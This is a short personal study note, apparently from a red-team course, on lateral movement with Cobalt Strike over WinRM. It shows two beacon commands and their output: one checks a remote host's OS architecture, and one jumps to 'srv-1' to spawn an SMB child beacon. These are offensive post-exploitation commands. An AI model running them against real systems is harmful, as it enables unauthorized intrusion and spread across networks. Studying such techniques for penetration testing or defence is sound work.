---
creation date: September 23rd 2022
last modified date: September 23rd 2022
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[PowerShell Remoting]]  
___

## Description:  

For Lateral Movement in Cobalt Strike


The `winrm` and `winrm64` methods can be used as appropriate for 32 and 64-bit targets.


Determine the architecture of a remote system

```
beacon> remote-exec winrm srv-1 (Get-WmiObject Win32_OperatingSystem).OSArchitecture
64-bit
```

Use an SMB beacon is windows environments
```
beacon> jump winrm64 srv-1 smb
[+] established link to child beacon: 10.10.17.25
```


___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: September 23rd 2022 (04:34 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
